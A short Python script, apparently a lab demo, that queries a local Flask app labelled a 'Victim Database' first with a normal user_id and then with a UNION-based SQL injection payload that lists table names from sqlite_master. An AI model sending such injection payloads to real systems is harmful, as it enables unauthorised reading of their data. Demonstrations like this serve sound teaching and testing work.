import requests

# Create Victim Database and Table
res = requests.get("http://127.0.0.1:5000/initialize-database")
print(res.json())

#Normal Query
parameters = {"user_id" : "1"}
res = requests.get("http://127.0.0.1:5000/select-image", params=parameters)
print(res.json())

#Query with Injection
injection_parameters = {"user_id" : "1 AND 2=1 UNION SELECT name FROM sqlite_master"}
res = requests.get("http://127.0.0.1:5000/select-image", params=injection_parameters)
print(res.json())